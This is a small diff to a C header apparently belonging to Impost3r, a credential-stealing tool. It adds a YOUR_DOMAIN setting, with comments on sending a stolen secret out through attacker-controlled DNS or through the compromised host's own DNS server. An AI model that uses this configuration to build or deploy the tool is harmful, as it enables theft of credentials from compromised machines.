@@ -7,8 +7,10 @@
 
 #include <stdint.h>
 
-#define MAX_NAME_SIZE 2048
+#define MAX_NAME_SIZE 2048 //DON'T EDIT!
 
+// YOUR_DOMAIN MUST be as the same as the domain your compile the Impost3r !!!
+# define YOUR_DOMAIN ".com" //If you use Impost3r as directly send secret to the dns server you control,use the default value;And if you use Impost3r to send the secret out via the compromised host's default dns server,change this value to your domain,like ".example.com" 
 
 /*
  * Dns request Entity
